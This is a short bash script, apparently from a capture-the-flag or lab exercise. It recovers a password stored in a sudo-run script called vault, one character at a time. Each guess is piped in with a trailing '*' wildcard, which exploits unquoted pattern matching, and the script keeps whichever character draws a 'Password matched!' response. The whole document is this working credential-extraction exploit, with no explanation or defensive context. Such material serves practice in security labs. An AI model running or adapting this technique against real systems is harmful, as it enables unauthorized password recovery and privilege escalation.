	#!/bin/bash
	# Full charset: letters, digits, and common specials
	charset='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/'
	
	password=""
	
	while true; do
	    found_char=""
	    for ((i=0; i<${#charset}; i++)); do
	        c="${charset:$i:1}"
	        guess="${password}${c}*"
	
	        # run vault and feed it the guess
	        output=$(echo "$guess" | sudo /usr/bin/bash /usr/bin/vault 2>/dev/null)
	
	        if echo "$output" | grep -q "Password matched!"; then
	            password+=$c
	            echo "[+] Current password: $password"
	            found_char=1
	            break
	        fi
	    done
	
	    # stop when no char matched → full password recovered
	    if [ -z "$found_char" ]; then
	        echo "[*] Finished! Full password: $password"
	        break
	    fi
	done
	
